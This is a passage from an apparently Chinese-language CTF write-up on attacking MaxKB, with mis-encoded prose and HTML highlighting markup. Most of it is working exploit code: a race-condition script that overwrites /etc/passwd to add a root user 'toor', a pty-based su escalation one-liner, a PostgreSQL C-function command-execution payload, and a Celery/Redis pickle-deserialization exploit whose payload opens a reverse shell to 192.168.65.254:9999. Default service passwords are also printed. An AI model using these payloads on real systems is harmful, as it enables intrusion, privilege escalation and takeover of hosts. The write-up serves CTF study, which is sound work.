string">"http"</span><span class="token punctuation">:</span> <span class="token string">"127.0.0.1:8083"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> res<span class="token punctuation">.</span>text            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token comment"># è§¦å‘ä½†ä¸ç­‰å¾…ï¼Œåªä¸ºäº†åˆ¶é€ æ–‡ä»¶å†™å…¥</span>                requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>endpoint<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ReadTimeout<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token comment"># print(e)</span>            <span class="token keyword">pass</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>login<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Phase 1: Injecting Racer payload..."</span><span class="token punctuation">)</span>        <span class="token comment"># å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹æ¥ä¿æŒ Racer åœ¨æœåŠ¡ç«¯è¿è¡Œ</span>        racer_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>            target<span class="token operator">=</span>self<span class="token punctuation">.</span>trigger_debug<span class="token punctuation">,</span>             args<span class="token operator">=</span><span class="token punctuation">(</span>INTERNAL_RACER_CODE<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>        racer_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment"># ç»™ Racer ä¸€ç‚¹å¯åŠ¨æ—¶é—´</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Phase 2: Flooding triggers to spark Race Condition..."</span><span class="token punctuation">)</span>        <span class="token comment"># å¹¶å‘å‘é€ 50 ä¸ªè¯·æ±‚ï¼Œå¢åŠ å‘½ä¸­æ¦‚ç‡</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\r[>] Sending trigger </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">/50..."</span></span><span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># å‘é€æçŸ­çš„ä»£ç ï¼Œåªä¸ºè§¦å‘ _exec_sandbox ä¸­çš„ open å’Œ chown</span>            dummy_code <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"print('Race_Attempt_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">')"</span></span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>                target<span class="token operator">=</span>self<span class="token punctuation">.</span>trigger_debug<span class="token punctuation">,</span>                 args<span class="token operator">=</span><span class="token punctuation">(</span>dummy_code<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># æå…¶çŸ­æš‚çš„å»¶è¿Ÿï¼Œé¿å…ç½‘ç»œé˜»å¡ï¼ŒåŒæ—¶ä¿æŒé«˜å¹¶å‘</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] Waiting for racer to complete..."</span><span class="token punctuation">)</span>        racer_thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Exploit finished. Check logs above for success."</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] If successful, you can now su to 'toor' with password 'root'."</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    exp <span class="token operator">=</span> MaxKBExploit<span class="token punctuation">(</span>TARGET_URL<span class="token punctuation">,</span> USERNAME<span class="token punctuation">,</span> PASSWORD<span class="token punctuation">)</span>    exp<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå°±å†™å…¥ &#x2F;etc&#x2F;passwd äº†ï¼Œæ¥ä¸‹æ¥å¯ä»¥åˆ©ç”¨ pty è¿›è¡Œ su ææƒæ“ä½œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">"import pty, os; p = pty;p.spawn(['su', 'toor','-c', 'whoami'], lambda fd: (os.write(fd, b'123456<span class="token entity" title="\n">\n</span>') if b'ssword' in (d:=os.read(fd, 1024)) else 0, d)[1])"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œå°±ç»§ç»­ç”¨ä¸Šé¢æ‹¿åˆ°çš„ pgsql çš„ shell æ¥å‘½ä»¤æ‰§è¡Œ</p><p>payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>socket<span class="token punctuation">,</span>shutil<span class="token punctuation">,</span>sys<span class="token punctuation">,</span>gc<span class="token punctuation">,</span>time<span class="token punctuation">,</span>redis<span class="token punctuation">,</span>psycopg2<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    conn <span class="token operator">=</span> psycopg2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>database<span class="token operator">=</span><span class="token string">"postgres"</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"Password123@postgres"</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token string">"5432"</span><span class="token punctuation">)</span>    cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"CREATE OR REPLACE FUNCTION sys_eva(text) RETURNS text AS '/opt/maxkb/data/postgresql/pgdata/shell.so', 'sys_eva' LANGUAGE C STRICT;select sys_eva('python3 -c \"import pty, os; p=pty;p.spawn([\\\"su\\\", \\\"toor\\\",\\\"-c\\\", \\\"whoami\\\"], lambda fd: (os.write(fd, b\\\"superman\\n\\\") if b\\\"ssword\\\" in (d:=os.read(fd, 1024)) else 0, d)[1])\"');"</span><span class="token punctuation">)</span>    rows <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> rows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20260111220427633.png"></p><hr><h2 id="è§£æ³•äºŒï¼šredis-æ‰“-pickle"><a href="#è§£æ³•äºŒï¼šredis-æ‰“-pickle" class="headerlink" title="è§£æ³•äºŒï¼šredis æ‰“ pickle"></a>è§£æ³•äºŒï¼šredis æ‰“ pickle</h2><p>æ‹¿åˆ° py é¡¹ç›®ä¹‹åå–œé—»ä¹è§çš„æ‰¾ pickle ç¯èŠ‚</p><p>æ³¨æ„åˆ° CELERY ä½¿ç”¨äº† pickle</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">CELERY_task_serializer <span class="token operator">=</span> <span class="token string">'pickle'</span>CELERY_result_serializer <span class="token operator">=</span> <span class="token string">'pickle'</span>CELERY_accept_content <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'json'</span><span class="token punctuation">,</span> <span class="token string">'pickle'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>çœ‹ä¸€ä¸‹ Celery æ˜¯å•¥ï¼š <a href="https://www.cnblogs.com/cwp-bg/p/8759638.html">https://www.cnblogs.com/cwp-bg/p/8759638.html</a></p><p>Celery å†…éƒ¨å®ç°äº† loads è¿›è¡Œååºåˆ—åŒ–ï¼Œè¿™ä¸ªä¸œè¥¿ç»•è¿‡äº† RestrictedUnpickler</p><p>å¹¶ä¸”æ­¤å¤„çš„ broker æ˜¯ redis æœåŠ¡ï¼Œå³ pickle æ˜¯ä¸ redis è¿›è¡Œçš„é€šä¿¡</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">CELERY_BROKER_URL <span class="token operator">=</span> <span class="token string">';'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>CELERY_BROKER_URL_FORMAT <span class="token operator">%</span> <span class="token punctuation">&#123;</span>    <span class="token string">'protocol'</span><span class="token punctuation">:</span> <span class="token string">'sentinel'</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> CONFIG<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'REDIS_PASSWORD'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'host'</span><span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'port'</span><span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'db'</span><span class="token punctuation">:</span> redis_celery_db<span class="token punctuation">&#125;</span> <span class="token keyword">for</span> item <span class="token keyword">in</span> sentinels<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>redis çš„å¯†ç æ˜¯é»˜è®¤çš„ Password123@redis ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸ redis çš„äº¤äº’æ‰“ Celery çš„ pickle ååºåˆ—åŒ–</p><p>vulhub ä¸Šæœ‰ä¸€ä¸ª celery3 æœªæˆæƒæ‰“ pickle çš„ expï¼š <a href="https://github.com/vulhub/vulhub/blob/master/celery/celery3_redis_unauth/exploit.py">https://github.com/vulhub/vulhub/blob/master/celery/celery3_redis_unauth/exploit.py</a></p><p>é¢˜ç›®ç‰ˆæœ¬æ˜¯ celery 5.5.3</p><p>SU çš„ expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""MaxKB RCE Exploit - Complete Attack Chainå¢åŠ ï¼šè¿œç¨‹å†™æ–‡ä»¶åŠŸèƒ½ write_remote_file()å¢åŠ ï¼šRedis Pickle æ³¨å…¥åŠŸèƒ½ inject_pickle_payload()ä¿®æ­£ï¼šä¿®å¤äº†æ‰€æœ‰ 'return' outside function çš„è¯­æ³•é”™è¯¯"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> base64<span class="token keyword">import</span> textwrap<span class="token keyword">import</span> pickle<span class="token keyword">import</span> subprocess<span class="token comment"># Target configuration</span>TARGET_URL <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:28080"</span>USERNAME <span class="token operator">=</span> <span class="token string">"admin"</span>PASSWORD <span class="token operator">=</span> <span class="token string">"MaxKB@123.."</span><span class="token comment"># API endpoints</span>API_BASE <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>TARGET_URL<span class="token punctuation">&#125;</span></span><span class="token string">/admin/api"</span></span>TOOL_DEBUG_API <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>API_BASE<span class="token punctuation">&#125;</span></span><span class="token string">/workspace/default/tool/debug"</span></span><span class="token comment"># Session setup</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'</span><span class="token punctuation">,</span>    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>    <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Login to MaxKB and get JWT token.    Returns the token string on success, None on failure.    """</span>    login_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> USERNAME<span class="token punctuation">,</span>        <span class="token string">"encryptedData"</span><span class="token punctuation">:</span> <span class="token string">"VQLS7jsDK8kKlSccMNTZkXc1+CK2NzISGlSr7p8RMkAN5lJXcFoou9KrOl5luQoN7qQ+RRmt9nW4pBFLUobyD0EC8ZlyHWJSxDONebYZUg4/ycb/0L1H0l3D5KttE1hdekUUFSA3TCNyTKpdykGxau8VzSd7JLNm04lJc+pmQ64aI9dj7AN5OpbYNvHJlVWUNl7v1fGK4ty1goAlpaxm9g05uxTCx+pSyQz1cayZ21o6qP/hsLVI9vTpKyVsp3qVKD6p4m/vk0XWgxfX1D94dzyJGrpjKLxiSypnG66zgwqBDroqMIVSa2X43og3qcxr43k380kT/loCAQVBz0qRbA=="</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    login_api <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>API_BASE<span class="token punctuation">&#125;</span></span><span class="token string">/user/login"</span></span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>login_api<span class="token punctuation">,</span> json<span class="token operator">=</span>login_data<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'data'</span> <span class="token keyword">in</span> result <span class="token keyword">and</span> result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token keyword">and</span> <span class="token string">'token'</span> <span class="token keyword">in</span> result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                token <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>                session<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'AUTHORIZATION'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Login successful!"</span></span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] JWT Token: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">50]</span><span class="token punctuation">&#125;</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>                <span class="token keyword">return</span> token            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Login failed: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">None</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Login request failed: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Login error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">execute_python_code</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Execute Python code through tool debug endpoint"""</span>    payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"code"</span><span class="token punctuation">:</span> code<span class="token punctuation">,</span>        <span class="token string">"input_field_list"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"init_field_list"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">"init_params"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token string">"debug_field_list"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>TOOL_DEBUG_API<span class="token punctuation">,</span> json<span class="token operator">=</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># print(result) # Uncomment for deep debugging</span>            <span class="token keyword">if</span> result<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Server-side error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span> result<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token string">'No data returned'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"HTTP </span><span class="token interpolation"><span class="token punctuation">&#123;</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Exception: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token comment"># ======================================</span><span class="token comment"># ========= æ–°å¢ï¼šPickleæ³¨å…¥åŠŸèƒ½ =========</span><span class="token comment"># ======================================</span><span class="token keyword">class</span> <span class="token class-name">PickleRCE</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>command <span class="token operator">=</span> command    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># è¿”å›ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡å’Œå…¶å‚æ•°</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"python3"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.65.254",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">inject_pickle_payload</span><span class="token punctuation">(</span>redis_host<span class="token punctuation">,</span> redis_port<span class="token punctuation">,</span> redis_password<span class="token punctuation">,</span> token<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Generates a pickle payload and injects it into Redis via the RCE vulnerability.    """</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] Crafting pickle payload to execute command: '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">'"</span></span><span class="token punctuation">)</span>        pickle_payload <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>PickleRCE<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>    b64_payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle_payload<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span>    redis_key <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f":TOKEN:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] Target Redis key will be: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>redis_key<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        remote_code <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""def set_pickle_in_redis():    import redis    import base64        try:        r = redis.Redis(host=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>redis_host<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">, port=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>redis_port<span class="token punctuation">&#125;</span></span><span class="token string">, password=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>redis_password<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">, db=0)        redis_key = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>redis_key<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">        b64_payload = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>b64_payload<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">        pickle_data = base64.b64decode(b64_payload)        r.set(redis_key, pickle_data)        return f"OK: Successfully wrote &#123;&#123;len(pickle_data)&#125;&#125; bytes of pickle data to key '&#123;&#123;redis_key&#125;&#125;'."    except Exception as e:        return f"Redis Error: &#123;&#123;e&#125;&#125;"set_pickle_in_redis() # &lt;-- FIX: Removed 'return' from here"""</span></span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Sending payload to remote server to inject into Redis..."</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> execute_python_code<span class="token punctuation">(</span>remote_code<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">execute_system_command</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Execute system command using a robust method."""</span>    <span class="token comment"># Using subprocess is generally better than os.system for capturing output</span>    code <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""def run_cmd():    import subprocess    import shlex        command = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>cmd<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">    try:        # Use shlex.split for better argument handling        args = shlex.split(command)        result = subprocess.run(args, capture_output=True, text=True, timeout=10)                output = result.stdout if result.stdout else ""        error = result.stderr if result.stderr else ""                if output or error:            return f"STDOUT:\\n&#123;&#123;output&#125;&#125;\\nSTDERR:\\n&#123;&#123;error&#125;&#125;"        else:            return "Command executed with no output."                except FileNotFoundError:        return f"Error: Command not found or path does not exist."    except Exception as e:        return f"Command execution failed: &#123;&#123;e&#125;&#125;"run_cmd() # &lt;-- FIX: Removed 'return' from here"""</span></span>    <span class="token keyword">return</span> execute_python_code<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Main exploitation function"""</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"MaxKB RCE Exploit - Complete Attack Chain"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Target: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>TARGET_URL<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token comment"># Step 1: Login</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+] Step 1: Authentication"</span><span class="token punctuation">)</span>    token <span class="token operator">=</span> login<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token 